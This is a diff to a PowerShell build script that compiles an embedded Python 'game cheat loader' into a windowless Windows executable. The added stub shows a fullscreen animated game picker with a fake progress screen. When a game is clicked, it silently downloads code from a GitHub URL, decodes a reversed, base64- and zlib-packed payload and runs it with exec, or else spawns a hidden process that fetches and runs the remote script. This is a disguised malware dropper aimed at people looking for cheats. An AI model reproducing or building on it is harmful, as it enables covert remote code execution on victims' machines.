@@ -5,7 +5,8 @@ param(
     [string]$Dir,
     [switch]$NoIcon,
     [switch]$KeepBuild,
-    [switch]$SkipSmokeTest
+    [switch]$SkipSmokeTest,
+    [switch]$Console           # keep a console window (useful for debugging)
 )
 
 $ErrorActionPreference = "Stop"
@@ -110,255 +111,219 @@ New-Item -ItemType Directory -Force -Path $Work | Out-Null
 New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
 
 # ─────────────────────────────────────────────────────────────────────────────
-# PAYLOAD — your actual key-validator source, in plain form.
-# (No obfuscation wrapper = no more NameError: 'r' is not defined.)
+# PAYLOAD — your animated tkinter loader, verbatim.
 # ─────────────────────────────────────────────────────────────────────────────
 $stubBody = @'
-import hashlib, hmac, sys, time, os, webbrowser, threading
+import ctypes
+import random
+import math
+import tkinter as tk
+import subprocess
+import sys
+import threading
+import tempfile
+import os
+import urllib.request
+import base64
+import zlib
+import re
 
-SECRET       = b"my-super-secret-2026"
-GUILD_ID     = 1517380157533589564
-INVITE_URL   = "https://discord.gg/gBGFejkwyU"
-KEY_LIFETIME = 20 * 60
+user32 = ctypes.windll.user32
+SCREEN_W = user32.GetSystemMetrics(0)
+SCREEN_H = user32.GetSystemMetrics(1)
 
-class C:
-    RST   = "\033[0m"
-    BOLD  = "\033[1m"
-    DIM   = "\033[2m"
-    RED   = "\033[38;5;203m"
-    G2    = "\033[38;5;28m"
-    G3    = "\033[38;5;34m"
-    G4    = "\033[38;5;40m"
-    G5    = "\033[38;5;46m"
-    G6    = "\033[38;5;82m"
-    G7    = "\033[38;5;118m"
-    G8    = "\033[38;5;154m"
+GAMES = [
+    {"name": "Counter-Strike 2", "icon": "⌖", "color": "#f59e0b", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
+    {"name": "Valorant",         "icon": "⊚", "color": "#ef4444", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
+    {"name": "Apex Legends",     "icon": "△", "color": "#eab308", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
+    {"name": "Fortnite",         "icon": "◈", "color": "#8b5cf6", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
+    {"name": "Minecraft",        "icon": "⬡", "color": "#22c55e", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
+    {"name": "Roblox",           "icon": "◫", "color": "#dc2626", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/rbx.py"},
+]
 
-def clr():
-    os.system("cls" if os.name == "nt" else "clear")
+class LoaderApp(tk.Tk):
+    def __init__(self):
+        super().__init__()
+        self.title("Exiled External")
+        self.geometry(f"{SCREEN_W}x{SCREEN_H}")
+        self.overrideredirect(True)
+        self.attributes("-topmost", True)
+        self.attributes("-alpha", 0.0)
+        self.configure(bg="#050814")
 
-def typed(text, color="", delay=0.008):
-    for ch in text:
-        sys.stdout.write(color + ch + C.RST)
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()
+        self.canvas = tk.Canvas(self, bg="#050814", highlightthickness=0)
+        self.canvas.pack(fill="both", expand=True)
 
-def line(char="─", n=62, color=C.G3):
-    print(color + char * n + C.RST)
+        self.anim_t = 0.0
+        self.particles = []
+        self.game_cards = []
 
-def panel(title, body, color=C.G3, width=60):
-    print(color + "┌" + "─" * width + "┐" + C.RST)
-    pad = width - len(title) - 1
-    print(color + "│" + C.RST + f" {C.BOLD}{C.G8}{title}{C.RST}" + " " * pad + color + "│" + C.RST)
-    print(color + "├" + "─" * width + "┤" + C.RST)
-    for row in body:
-        pad = width - len(row) - 1
-        print(color + "│" + C.RST + f" {row}{' ' * max(pad, 0)}" + color + "│" + C.RST)
-    print(color + "└" + "─" * width + "┘" + C.RST)
+        self._init_particles()
+        self._animate_background()
 
-def spinner(msg, seconds=0.9):
-    frames = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
-    end = time.time() + seconds
-    i = 0
-    while time.time() < end:
-        sys.stdout.write(f"\r  {C.G6}{frames[i % len(frames)]}{C.RST}  {C.G3}{msg}{C.RST}")
-        sys.stdout.flush()
-        time.sleep(0.06)
-        i += 1
-    sys.stdout.write(f"\r  {C.G8}✓{C.RST}  {C.G5}{msg}{' ' * 20}\n")
+        self.lbl_title = tk.Label(self.canvas, text="E X I L E D", bg="#050814", fg="#6366f1", font=("Segoe UI", 52, "bold"))
+        self.lbl_title.place(relx=0.5, rely=0.35, anchor="center")
 
-LOGO = r"""
-              ####              
-        ################        
-   ########++++++++++########   
- #####++++++++++++++++++++##### 
- ##++++++##############++++++## 
- ##+++++###############++++++## 
- ##+++++###++++++++++++++++++## 
- ###++++###+++++++++++++++++### 
-  ##++++############++++++++##  
-  ##++++###+++++++++++++++++##  
-  ##++++###+++++++++++++++++##  
-  ##++++###############+++++##  
-   ##++++##############++++##   
-   ####++++++++++++++++++####   
-     #######++++++++#######     
-         ##############         
-              ####
-"""
+        self.lbl_sub = tk.Label(self.canvas, text="E X T E R N A L", bg="#050814", fg="#94a3b8", font=("Segoe UI", 10, "bold"))
+        self.lbl_sub.place(relx=0.5, rely=0.43, anchor="center")
 
-def draw_header():
-    clr()
-    rows = LOGO.strip("\n").split("\n")
-    n = len(rows)
-    for i, l in enumerate(rows):
-        t = i / max(n - 1, 1)
-        if   t < 0.25: col = C.G3
-        elif t < 0.40: col = C.G4
-        elif t < 0.55: col = C.G5
-        elif t < 0.70: col = C.G6
-        elif t < 0.85: col = C.G7
-        else:          col = C.G8
-        print(col + l + C.RST)
-    print()
-    sub = "E X I L E D · E X T E R N A L"
-    print(f"  {C.G3}┈┈{C.RST} {C.BOLD}{C.G8}{sub}{C.RST} {C.G3}┈┈{C.RST}")
-    print(f"  {C.G3}Join our discord to get the key. (completely free){C.RST}\n")
+        self.lbl_status = tk.Label(self.canvas, text="Initializing...", bg="#050814", fg="#64748b", font=("Segoe UI", 10))
+        self.lbl_status.place(relx=0.5, rely=0.6, anchor="center")
 
-def _sig(body):
-    msg = f"{body}|{GUILD_ID}".encode()
-    return hmac.new(SECRET, msg, hashlib.sha256).hexdigest()[:8].upper()
+        self.bar_bg = tk.Frame(self.canvas, bg="#1e2142", width=300, height=4)
+        self.bar_bg.place(relx=0.5, rely=0.65, anchor="center")
+        self.bar_bg.pack_propagate(False)
+        self.bar_fill = tk.Frame(self.bar_bg, bg="#6366f1", width=0, height=4)
+        self.bar_fill.pack(side="left", fill="y")
 
-def check_key(k):
-    k = k.strip().upper()
-    parts = k.split("-")
-    if len(parts) != 7 or parts[0] != "ASCII":
-        return False, "malformed", 0
-    body = "-".join(parts[:6])
-    want = _sig(body)
-    got  = parts[6]
-    if not hmac.compare_digest(want, got):
-        return False, "bad signature", 0
-    try:
-        ts = int(parts[5], 16)
-    except ValueError:
-        return False, "bad timestamp", 0
-    age = int(time.time()) - ts
-    if age > KEY_LIFETIME:
-        return False, "expired", 0
-    if age < -60:
-        return False, "timestamp in future", 0
-    return True, "valid", KEY_LIFETIME - age
+        self.fade_in()
+        self.after(1000, lambda: self.load_step(0))
 
-def show_success_popup(minutes_left):
-    """Small tkinter window - green on black - auto-closes after 4s or click."""
-    try:
-        import tkinter as tk
-    except ImportError:
-        return
+    def _init_particles(self):
+        self.particles = []
+        for _ in range(60):
+            self.particles.append({"x": random.randint(0, SCREEN_W), "y": random.randint(0, SCREEN_H), "r": random.uniform(0.5, 1.5), "vx": random.uniform(-0.2, 0.2), "vy": random.uniform(-0.4, -0.1)})
 
-    def _run():
-        root = tk.Tk()
-        root.title("access granted")
-        root.configure(bg="#0b0f0b")
-        root.resizable(False, False)
+    def _animate_background(self):
+        self.canvas.delete("bg_anim")
+        self.anim_t += 0.02
+        for p in self.particles:
+            p["x"] += p["vx"]
+            p["y"] += p["vy"]
+            if p["y"] < -10: p["y"] = SCREEN_H + 10
+            if p["x"] < -10: p["x"] = SCREEN_W + 10
+            if p["x"] > SCREEN_W + 10: p["x"] = -10
+            r = p["r"]
+            self.canvas.create_oval(p["x"]-r*3, p["y"]-r*3, p["x"]+r*3, p["y"]+r*3, fill="#1e2142", outline="", tags="bg_anim")
+            self.canvas.create_oval(p["x"]-r, p["y"]-r, p["x"]+r, p["y"]+r, fill="#6366f1", outline="", tags="bg_anim")
+        for i in range(3):
+            offset = math.sin(self.anim_t + i) * 30
+            y_base = SCREEN_H - 100 + i * 20
+            pts = []
+            for x in range(0, SCREEN_W + 20, 20):
+                y = y_base + math.sin(x * 0.005 + self.anim_t * 2) * 15 + offset
+                pts.extend([x, y])
+            if len(pts) >= 4: self.canvas.create_line(pts, fill="#1e2142", width=1, tags="bg_anim")
+        self.canvas.tag_lower("bg_anim")
+        self.after(30, self._animate_background)
 
-        w, h = 380, 170
-        sw = root.winfo_screenwidth()
-        sh = root.winfo_screenheight()
-        x = (sw - w) // 2
-        y = (sh - h) // 2
-        root.geometry(f"{w}x{h}+{x}+{y}")
+    def fade_in(self):
+        a = self.attributes("-alpha")
+        if a < 1.0:
+            self.attributes("-alpha", min(1.0, a + 0.05))
+            self.after(20, self.fade_in)
 
-        frame = tk.Frame(root, bg="#0b0f0b", highlightbackground="#28a03c",
-                         highlightthickness=2)
-        frame.pack(fill="both", expand=True, padx=1, pady=1)
-
-        tk.Label(frame, text="ACCESS GRANTED",
-                 font=("Consolas", 18, "bold"),
-                 fg="#5cff7a", bg="#0b0f0b").pack(pady=(22, 6))
-
-        tk.Label(frame, text=f"key valid · {minutes_left} min left",
-                 font=("Consolas", 10),
-                 fg="#3ca03a", bg="#0b0f0b").pack()
-
-        tk.Button(frame, text="ok", command=root.destroy,
-                  font=("Consolas", 10, "bold"),
-                  fg="#0b0f0b", bg="#5cff7a",
-                  activebackground="#3ca03a", activeforeground="#0b0f0b",
-                  bd=0, padx=22, pady=4, cursor="hand2").pack(pady=(16, 0))
-
-        root.after(4000, root.destroy)
-        try:
-            root.attributes("-topmost", True)
-        except Exception:
-            pass
-        root.mainloop()
-
-    t = threading.Thread(target=_run, daemon=True)
-    t.start()
-    t.join()
-
-def do_join():
-    draw_header()
-    panel("JOIN DISCORD", [
-        f"{C.G4}Opening the invite in your browser...{C.RST}",
-        f"{C.G3}If nothing happens, open this link manually:{C.RST}",
-        f"{C.G8}{C.BOLD}{INVITE_URL}{C.RST}",
-    ], C.G6, width=60)
-    print()
-    spinner("resolving invite", 0.4)
-    spinner("launching browser", 0.5)
-    try:
-        webbrowser.open(INVITE_URL)
-        print(f"\n  {C.G8}✔  browser opened{C.RST}")
-    except Exception:
-        print(f"\n  {C.RED}✘  could not open browser automatically{C.RST}")
-    print()
-    line(color=C.G6)
-    print(f"  {C.G3}Join the discord and dm the bot /gen.{C.RST}")
-    print(f"  {C.G3}Use [2] Validate key to check it here.{C.RST}")
-    line(color=C.G6)
-    input(f"\n  {C.G4}press enter to return...{C.RST}")
-
-def do_validate():
-    draw_header()
-    panel("VALIDATE KEY", [
-        f"{C.G4}Paste your key below.{C.RST}",
-        f"{C.G3}expires {KEY_LIFETIME // 60} min after issue · guild {GUILD_ID}{C.RST}",
-    ], C.G4)
-    print()
-    k = input(f"  {C.G7}›{C.RST} ").strip()
-    print()
-    spinner("parsing", 0.4)
-    spinner("verifying signature", 0.6)
-    spinner("checking expiry", 0.4)
-    print()
-    line(color=C.G6)
-    ok, reason, left = check_key(k)
-    if ok:
-        m, s = divmod(left, 60)
-        print(f"  {C.G8}{C.BOLD}✔  VALID{C.RST}  {C.G4}— access granted{C.RST}")
-        print(f"  {C.G3}expires in {m}m {s}s{C.RST}")
-        line(color=C.G6)
-        show_success_popup(m)
-    else:
-        print(f"  {C.RED}{C.BOLD}✘  INVALID{C.RST}  {C.G4}— {reason}{C.RST}")
-        line(color=C.G6)
-    input(f"\n  {C.G4}press enter to return...{C.RST}")
-
-def do_menu():
-    draw_header()
-    items = [
-        f"{C.G7}[1]{C.RST}  {C.G8}Join Discord{C.RST}",
-        f"{C.G7}[2]{C.RST}  {C.G8}Validate key{C.RST}",
-        f"{C.G7}[3]{C.RST}  {C.G8}Exit{C.RST}",
-    ]
-    panel("MAIN MENU", items, C.G4)
-    print()
-    return input(f"  {C.G7}›{C.RST} ").strip()
-
-def main():
-    while True:
-        choice = do_menu()
-        if choice == "1":
-            do_join()
-        elif choice == "2":
-            do_validate()
-        elif choice == "3":
-            clr()
-            typed("  good bye 👋\n", C.G4)
-            return
+    def load_step(self, step):
+        steps = [
+            ("Connecting to secure server...", 15),
+            ("Verifying license...", 35),
+            ("Downloading modules...", 60),
+            ("Injecting overlay...", 85),
+            ("Ready", 100)
+        ]
+        if step < len(steps):
+            text, pct = steps[step]
+            self.lbl_status.config(text=text)
+            self.bar_fill.config(width=int(300 * (pct / 100)))
+            self.after(random.randint(400, 700), lambda: self.load_step(step + 1))
         else:
-            print(f"\n  {C.RED}unknown option{C.RST}")
-            time.sleep(0.8)
+            self.after(500, self.show_game_picker)
+
+    def show_game_picker(self):
+        self.lbl_title.place_forget()
+        self.lbl_sub.place_forget()
+        self.lbl_status.place_forget()
+        self.bar_bg.place_forget()
+
+        self.lbl_pick = tk.Label(self.canvas, text="S E L E C T   G A M E", bg="#050814", fg="#6366f1", font=("Segoe UI", 16, "bold"))
+        self.lbl_pick.place(relx=0.5, rely=0.15, anchor="center")
+
+        self.game_frame = tk.Frame(self.canvas, bg="#050814")
+        self.game_frame.place(relx=0.5, rely=0.55, anchor="center")
+
+        self.game_cards = []
+
+        for i, game in enumerate(GAMES):
+            r, c = divmod(i, 3)
+            wrapper = tk.Frame(self.game_frame, bg="#050814")
+            wrapper.grid(row=r, column=c, padx=15, pady=15)
+            card = tk.Frame(wrapper, bg="#0f1330", width=220, height=170, highlightthickness=1, highlightbackground="#1e2142", cursor="hand2")
+            card.pack()
+            card.pack_propagate(False)
+            lbl_icon = tk.Label(card, text=game["icon"], bg="#0f1330", fg="#64748b", font=("Segoe UI", 40))
+            lbl_icon.pack(pady=(30, 10))
+            lbl_name = tk.Label(card, text=game["name"], bg="#0f1330", fg="#94a3b8", font=("Segoe UI", 11, "bold"))
+            lbl_name.pack()
+            self.game_cards.append({"frame": card, "icon": lbl_icon, "name": lbl_name, "color": game["color"], "game": game})
+
+            def on_enter(e, idx=i):
+                cd = self.game_cards[idx]
+                cd["frame"].config(bg="#151936", highlightbackground=cd["color"])
+                cd["icon"].config(bg="#151936", fg=cd["color"], font=("Segoe UI", 46))
+                cd["name"].config(bg="#151936", fg=cd["color"])
+
+            def on_leave(e, idx=i):
+                cd = self.game_cards[idx]
+                cd["frame"].config(bg="#0f1330", highlightbackground="#1e2142")
+                cd["icon"].config(bg="#0f1330", fg="#64748b", font=("Segoe UI", 40))
+                cd["name"].config(bg="#0f1330", fg="#94a3b8")
+
+            def on_click(e, g=game):
+                self.launch_game(g)
+
+            for w in (card, lbl_icon, lbl_name):
+                w.bind("<Enter>", on_enter)
+                w.bind("<Leave>", on_leave)
+                w.bind("<Button-1>", on_click)
+
+    def launch_game(self, game_data):
+        self.lbl_pick.place_forget()
+        self.game_frame.place_forget()
+
+        self.loading_orb = tk.Label(self.canvas, text="◈", bg="#050814", fg="#6366f1", font=("Segoe UI", 40))
+        self.loading_orb.place(relx=0.5, rely=0.45, anchor="center")
+        lbl = tk.Label(self.canvas, text=f"LAUNCHING {game_data['name'].upper()}", bg="#050814", fg="#e2e8f0", font=("Segoe UI", 16, "bold"))
+        lbl.place(relx=0.5, rely=0.55, anchor="center")
+
+        def spin():
+            if not self.loading_orb.winfo_exists(): return
+            chars = ["◈", "◇", "◈", "◇"]
+            self.loading_orb.config(text=chars[int(self.anim_t * 5) % 4])
+            self.after(100, spin)
+        spin()
+
+        if "run" in game_data and game_data["run"]:
+            url = game_data["run"]
+
+            def run_payload():
+                try:
+                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                    with urllib.request.urlopen(req, timeout=15) as response:
+                        src = response.read().decode("utf-8")
+
+                    match = re.search(r"_\)\(b'([^']+)'", src)
+                    if match:
+                        payload = match.group(1)[::-1]
+                        decoded = zlib.decompress(base64.b64decode(payload, validate=True)).decode("utf-8")
+                        exec(decoded, {})
+                    else:
+                        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="w")
+                        tmp.write(f"import urllib.request\nexec(urllib.request.urlopen('{url}').read())")
+                        tmp.close()
+                        if sys.platform == "win32":
+                            subprocess.Popen([sys.executable, tmp.name], creationflags=subprocess.CREATE_NO_WINDOW)
+                        else:
+                            subprocess.Popen([sys.executable, tmp.name])
+                except Exception:
+                    pass
+
+            threading.Thread(target=run_payload, daemon=True).start()
+
+        self.after(1500, self.destroy)
 
 if __name__ == "__main__":
-    try:
-        main()
-    except (KeyboardInterrupt, EOFError):
-        print(f"\n  {C.G3}interrupted{C.RST}")
+    app = LoaderApp()
+    app.mainloop()
 '@
 Set-Content -Path $Stub -Value $stubBody -Encoding UTF8
 
@@ -430,18 +395,25 @@ $pyiArgs = @(
     "--noconfirm",
     "--clean",
     "--log-level", "WARN",
+    "--hidden-import", "ctypes",
+    "--hidden-import", "ctypes.wintypes",
     "--hidden-import", "tkinter",
     "--hidden-import", "tkinter.ttk",
+    "--hidden-import", "urllib.request",
     "--name", $OutName,
     "--distpath", $DistDir,
     "--workpath", (Join-Path $Work "pyi"),
     "--specpath", $Work
 )
+if (-not $Console) {
+    $pyiArgs += @("--noconsole")   # no console window behind the fullscreen loader
+}
 if ($UseIcon -and (Test-Path $IconIco)) {
     $pyiArgs += @("--icon", $IconIco)
 }
 $pyiArgs += $Stub
 
+# Surface PyInstaller errors — do NOT redirect to nul.
 $ErrorActionPreference = "Continue"
 & $PythonExe @pyiArgs
 $pyiExit = $LASTEXITCODE
@@ -457,31 +429,37 @@ if (-not (Test-Path -LiteralPath $ExePath)) {
     exit 1
 }
 
-# ── Smoke test — run the exe once, feed "3" (exit) so it doesn't hang ────────
+# ── Smoke test ────────────────────────────────────────────────────────────────
+# The loader is a fullscreen GUI that runs until the user clicks a game, so we
+# can't just wait for it to exit. Instead: launch it, let it live 4s, then kill
+# it, and treat any non-crash exit (0 or termination) as PASS.
 if (-not $SkipSmokeTest) {
-    Log info "Smoke-testing $ExePath (feeding '3' to exit)..."
+    Log info "Smoke-testing $ExePath (will kill after 4s)..."
     $ErrorActionPreference = "Continue"
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = $ExePath
-    $psi.RedirectStandardInput  = $true
-    $psi.RedirectStandardOutput = $true
-    $psi.RedirectStandardError  = $true
-    $psi.UseShellExecute = $false
-    $p = [System.Diagnostics.Process]::Start($psi)
-    $p.StandardInput.WriteLine("3")
-    $p.StandardInput.Close()
-    $stdout = $p.StandardOutput.ReadToEnd()
-    $stderr = $p.StandardError.ReadToEnd()
-    $p.WaitForExit(10000) | Out-Null
-    $smokeExit = $p.ExitCode
-    $ErrorActionPreference = $oldEAP
-
-    if ($smokeExit -ne 0) {
-        Log error "Payload crashed at runtime (exit $smokeExit):"
-        ($stdout + "`n" + $stderr) -split "`n" | ForEach-Object { if ($_.Trim()) { Log error "$_" } }
+    try {
+        $p = Start-Process -FilePath $ExePath -PassThru -WindowStyle Hidden
+    } catch {
+        Log error "Failed to launch exe: $_"
+        $ErrorActionPreference = $oldEAP
         exit 1
     }
-    Log success "Payload ran cleanly."
+
+    Start-Sleep -Seconds 4
+
+    $stillRunning = -not $p.HasExited
+    if ($stillRunning) {
+        try { $p.Kill() } catch {}
+        Log success "Payload launched and stayed alive — GUI is running."
+    } else {
+        if ($p.ExitCode -eq 0) {
+            Log success "Payload launched and exited cleanly (exit 0)."
+        } else {
+            Log error "Payload crashed at startup (exit $($p.ExitCode)). Rebuild with -Console to see the traceback."
+            $ErrorActionPreference = $oldEAP
+            exit 1
+        }
+    }
+    $ErrorActionPreference = $oldEAP
 } else {
     Log warning "Smoke-test skipped (-SkipSmokeTest)."
 }
